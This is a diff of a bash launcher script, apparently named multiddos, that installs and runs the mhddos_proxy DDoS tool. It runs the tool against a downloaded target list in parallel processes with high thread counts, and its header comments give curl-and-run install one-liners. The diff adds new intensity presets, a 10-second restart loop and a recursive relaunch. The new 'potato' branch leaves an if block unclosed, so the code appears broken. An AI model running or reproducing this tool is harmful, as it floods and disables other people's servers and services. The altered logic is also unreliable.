@@ -1,12 +1,18 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.0.1\n"
+clear && echo -e "Loading... v1.0.1a\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
 pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
 rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
+
+gotop="on"
+db1000n="off"
+vnstat="off"
+proxy_finder="off"
+export quality_settings="default"
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -22,19 +28,6 @@ typing_on_screen (){
     tput sgr0 2 &>/dev/null
 }
 export -f typing_on_screen
-
-# #if launched in docker than variables saved in docker md.sh will be used
-# if [[ $docker_mode != "true" ]]; then
-    gotop="on"
-    db1000n="off"
-    vnstat="off"
-    proxy_finder="off"
-    export threads="-t 2500"
-    export quality_settings="medium"
-# fi
-
-# if [[ $t_set_manual != "on" ]]; then export threads="-t 2500"; fi # default threads if not passed in cmd line
-# if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
 
 ### prepare target files and show banner
 prepare_targets_and_banner () {
@@ -82,10 +75,10 @@ if [[ $gotop == "on" ]]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
         sudo dpkg -i gotop.deb
     fi
-    tmux new-session -s multiddos -d 'gotop -sc solarized'
+    tmux new-session -s multidd -d 'gotop -sc solarized'
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
-    tmux new-session -s multiddos -d 'bash auto_bash.sh'
+    tmux new-session -s multidd -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
@@ -109,6 +102,7 @@ while [ "$1" != "" ]; do
         +d | --db1000n )   db1000n="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
+        --potato ) export quality_settings="potato"; shift ;;
         --low ) export quality_settings="low"; shift ;;
         --medium ) export quality_settings="medium"; shift ;;
         --high ) export quality_settings="high"; shift ;;
@@ -132,6 +126,9 @@ while true; do
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
+    if [[ $quality_settings == "potato" ]]; then
+        tail -n 500 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 1000 $args_to_pass &
     if [[ $quality_settings == "low" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 2000 $args_to_pass &
@@ -139,6 +136,10 @@ while true; do
         cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2000 $args_to_pass &
+    elif [[ $quality_settings == "default" ]]; then
+        cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 4000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 4000 $args_to_pass &
     elif [[ $quality_settings == "high" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 4 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2500 $args_to_pass &
@@ -152,8 +153,9 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
-sleep 30m
+sleep 10
 pkill -f start.py; pkill -f runner.py;
+bash md2.sh --low; tmux kill-session -t multidd
 prepare_targets_and_banner
 rm -rf ~/multidd/mhddos_proxy/
 done
